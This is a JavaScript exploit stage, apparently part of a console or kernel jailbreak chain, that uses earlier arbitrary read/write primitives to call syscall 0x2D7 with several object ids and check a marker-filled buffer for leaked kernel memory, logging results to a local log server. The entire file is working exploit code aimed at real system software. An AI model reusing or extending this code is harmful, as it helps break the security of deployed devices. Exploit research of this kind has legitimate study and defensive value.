// 11_leak.js — 727 across live ids (25003/90539 from fill + small ints).
// SAME SESSION ONLY (table dies on relaunch). No init (already done), no cleanup.
(async () => {
    const LOG_HOST = "192.168.0.163";
    const say = (s) => { try { log("[l11] " + s); } catch (e) {} };
    const shout = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    try { if (typeof checkLogServer === "function") await checkLogServer(); } catch (e) {}
    const pace = () => new Promise((r) => setTimeout(r, 500));
    const IDS = [1n, 2n, 25003n, 90539n];
    await (async () => { shout("l11: start"); say("start"); await pace(); })();
    for (const id of IDS) {
        shout("l11: try " + id); say("try " + id); await pace();
        try {
            const ob = malloc(0x40);
            for (let i = 0n; i < 0x40n; i += 8n) write64(ob + i, 0xDEADBEEFn + i);
            const r = await syscall(0x2D7n, id, ob, 0n, 0n, 0n, 0n);
            let ch = [];
            try {
                for (let i = 0n; i < 0x40n; i += 8n) {
                    const v = read64(ob + i);
                    if (v !== (0xDEADBEEFn + i)) ch.push(i.toString() + "=" + v.toString(16));
                }
            } catch (e) { ch.push("READFAULT"); }
            shout(("l11: id=" + id + " ret=" + String(r) + " ch=" + ch.length).slice(0,110));
            say("id=" + id + " ret=" + String(r) + " ch[" + ch.length + "]" + (ch.length ? " " + ch.slice(0,4).join(" ") : ""));
            await pace();
        } catch (e) { shout("l11: id=" + id + " THREW"); say("id " + id + " threw"); await pace(); }
    }
    shout("l11: done"); say("leak sweep done");
})()
